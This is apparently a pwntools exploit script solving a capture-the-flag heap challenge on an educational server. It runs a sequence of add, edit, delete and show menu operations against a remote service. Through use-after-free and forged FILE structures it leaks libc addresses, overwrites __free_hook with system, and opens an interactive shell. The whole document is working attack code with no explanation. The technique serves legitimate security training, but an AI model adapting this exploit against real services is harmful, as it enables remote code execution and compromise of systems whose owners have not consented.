from pwn import *

context.arch = "amd64"

r = remote('edu-ctf.zoolab.org', 10011)
#r = process("share/chal")

# add 0
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'0')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'AAAAAAAAAAAAAAAA')

# edit 0
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'0')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x18).encode())
r.send(b'test0')

# add 1
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'BBBBBBBBBBBBBBBB')

# delete 1
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')

# delete 0
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'0')

# show
print(r.recvuntil(b'> ').decode())
r.sendline(b'4')
print(r.recvuntil(b'[0] ').decode())
user1_data = u64(r.recv(6).ljust(8, b'\x00'))
libc_addr = user1_data - 0x1010

# edit 0
r.recvuntil(b'> ')
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'0')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x1d8).encode())
fake_chunk = flat(
    0xfbad0800, 0,
    libc_addr, 0,
    libc_addr, libc_addr + 0x8,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1,
)
r.send(fake_chunk)
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ED200
free_hook = libc + 0x1eee48
system = libc + 0x52290

# add 2
r.recvuntil(b'> ')
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'CCCCCCCCCCCCCCCC')

# add 3
r.recvuntil(b'> ')
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'DDDDDDDDDDDDDDDD')

# edit 2
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x18).encode())
r.send(b'test2')

# delete 2
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')

# edit 2
r.recvuntil(b'> ')
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x1d8).encode())
fake_chunk = flat(
    0xfbad0800, 0,
    0, 0,
    user1_data, 0,
    0, user1_data,
    user1_data + 0x400, 0,
    0, 0,
    0, 0,
    0,
)
r.send(fake_chunk)

# show
print(r.recvuntil(b'> ').decode())
r.sendline(b'4')
r.send(b'/bin/sh\x00' + b'\x00'*504)
r.send(b'\x00'*512)

# add 4
r.recvuntil(b'> ')
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'4')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'EEEEEEEEEEEEEEEE')

# edit 4
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'4')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x18).encode())
r.send(b'test4')

# delete 4
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'4')

# edit 4
r.recvuntil(b'> ')
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'4')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x1d8).encode())
fake_chunk = flat(
    0xfbad0800, 0,
    0, 0,
    free_hook, 0,
    0, free_hook,
    free_hook + 0x600, 0,
    0, 0,
    0, 0,
    0,
)
r.send(fake_chunk)

# show
print(r.recvuntil(b'> ').decode())
r.sendline(b'4')
r.send(p64(system) + b'\x00'*504)
r.send(b'\x00'*512)
r.send(b'\x00'*512)

# delete 3
r.recvuntil(b'> ')
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'3')

#gdb.attach(r)
r.interactive()